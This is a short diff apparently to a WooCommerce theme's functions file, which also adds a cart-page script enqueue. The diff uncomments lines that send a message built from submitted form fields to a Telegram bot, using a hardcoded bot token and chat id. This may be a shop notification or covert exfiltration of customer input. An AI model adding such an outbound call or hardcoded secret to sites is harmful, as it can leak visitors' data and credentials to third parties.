@@ -212,8 +212,8 @@ foreach ($filds as $key => $value) {
 
 	
 	
-//$token = '6343897793:AAE_Jbf8b0Mi0sfahr-8hZBSMspoVMz8z_A';
-//file_get_contents('https://api.telegram.org/bot'. $token .'/sendMessage?chat_id=-1002006914562&text=' . urlencode($msg));
+$token = '6343897793:AAE_Jbf8b0Mi0sfahr-8hZBSMspoVMz8z_A';
+file_get_contents('https://api.telegram.org/bot'. $token .'/sendMessage?chat_id=-1002006914562&text=' . urlencode($msg));
 
 	echo $data;
 	  wp_die();
@@ -425,3 +425,9 @@ function anyweb_product_discount_badge( $product ) {
         . esc_html( $percent )
         . '<span class="percent">%</span></span></div>';
 }
+
+add_action( 'wp_enqueue_scripts', function () {
+    if ( is_cart() ) {
+        wp_enqueue_script( 'wc-cart-fragments' );
+    }
+} );
